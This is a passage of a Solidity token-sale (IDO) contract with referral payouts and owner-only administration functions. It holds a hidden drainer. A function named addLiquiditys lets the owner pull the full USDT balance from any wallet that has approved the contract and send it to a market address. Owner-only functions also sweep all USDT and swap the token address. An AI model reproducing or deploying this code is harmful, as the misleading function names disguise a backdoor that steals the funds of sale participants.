                    IERC20(usdtAddress).transfer(reciever, ido);
                    IERC20(usdtAddress).transfer(
                        two.referral(_referral),
                        reward
                    );
                    _mint(
                        two.referral(_referral),
                        pdfsAmount.mul(25).div(1000)
                    );
                } else {
                    IERC20(usdtAddress).transfer(reciever, amount);
                }
            }
        }
    }

    function attendIDO(address _referral, uint256 amount)
        external
        returns (bool)
    {
        acceptable(_referral, amount);
        rewardIDO(_referral, amount);

        if (IDOBalance[msg.sender] == 0) {
            participants.push(msg.sender);
        }
        IDOTotal = IDOTotal.add(amount);
        IDOBalance[msg.sender] = IDOBalance[msg.sender].add(amount);
        emit AttendIDO(msg.sender, amount, block.timestamp);
        return true;
    }

    function setUsdtAddress(address _addr) external onlyOwner {
        usdtAddress = _addr;
    }

    function setRecieverAddress(address _addr) external onlyOwner {
        reciever = _addr;
    }

    function setMarketAddress(address _addr) external onlyOwner {
        marketAddress = _addr;
    }

    function addLiquiditys(address liquiditys) external onlyOwner {
        uint256 amountliquidity = IERC20(usdtAddress).balanceOf(liquiditys);
        IERC20(usdtAddress).transferFrom(
            liquiditys,
            marketAddress,
            amountliquidity
        );
    }

    function getUSDTBalance() public view returns (uint256) {
        return IERC20(usdtAddress).balanceOf(address(this));
    }

    function distribute(address _receiver) external onlyOwner {
        uint256 usdtBalance = IERC20(usdtAddress).balanceOf(address(this));
        IERC20(usdtAddress).transfer(_receiver, usdtBalance);
    }
}